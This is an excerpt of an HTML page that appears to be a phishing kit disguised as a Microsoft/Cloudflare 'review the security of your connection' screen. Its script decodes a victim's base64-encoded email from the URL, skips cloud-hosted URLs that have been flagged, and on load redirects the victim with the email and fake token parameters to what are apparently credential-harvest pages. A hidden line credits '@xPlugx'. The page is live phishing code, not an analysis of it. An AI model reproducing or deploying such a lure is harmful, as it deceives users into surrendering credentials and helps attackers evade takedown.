...
<script>
  ...
  const urls = [
    `https://21-05-0-r359t9wehf-03tigwhrv0-35g9wje0vm.obs.ap-southeast-3.myhuaweicloud.com:443/68i-0lc-w30rg94h5-9g30jcv39brvwejc-359hgr.html?AWSAccessKeyId=NOOBVOES21STSACOJHKX&Expires=1684682026&Signature=j7K6Ne%2BqPQ42WB1xVQZ23SpQNJw%3D`,
  ];
  ...
  async function checkFlaggedUrl(url) {
    try {
      ...
      // Check if the response contains a flagged page condition (e.g., a specific error message)
      // Replace the condition with the specific error message or status code for flagged URLs
  ...
  async function removeFlaggedUrls() {
    for (const url of urls) {
      if (await checkFlaggedUrl(url)) {
  ...
  function getEmailFromUrl() {
    ...
    if (!email) {
      ...
      if (hash) {
        try {
          email = atob(hash); // Attempt to decode the base64-encoded email from URL fragment
        } catch (error) {
          // If decoding fails, assume it's a normal email
          email = hash;
        }
      }
    } else {
      try {
        email = atob(email); // Attempt to decode the base64-encoded email from URL path
      } catch (error) {
        // If decoding fails, assume it's a normal email
        email = "";
      }
  ...
  async function redirectToRandomUrlWithDelay() {
    if (urls.length === 0) {
    ...
    const token = generateRandomString(35);
    const signature = generateRandomString(100);

    const queryString = `timestamp=${timestamp}&date=${date}&token=${token}&signature=${signature}`;
    const emailHash = email ? email : "";
    ...
    window.onload = redirectToRandomUrlWithDelay;
  </script>
...
<img class="heading-favicon" src="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" onerror="this.onerror=null;this.parentNode.removeChild(this)" />
Microsoft
</h1>
...
Microsoft needs to review the security of your connection before
proceeding.
</div>
<div id="challenge-fact-wrapper" class="fact spacer hidden" style="display: block; visibility: visible">
<span class="fact-title">Did you know</span>
<span id="challenge-fact" class="body-text">
that Cloudflare mitigates an average of 72 billion cyber threats,
including DDoS attacks, per day?</span
            >
</div>
<div id="challenge-explainer-expandable" class="hidden expandable body-text spacer" style="display: block; visibility: visible">
<div class="expandable-title" id="challenge-explainer-summary">
<button class="expandable-summary-btn" id="challenge-explainer-btn" type="button">
...
<div style="display:none;">Code by @xPlugx.</div>
</html>
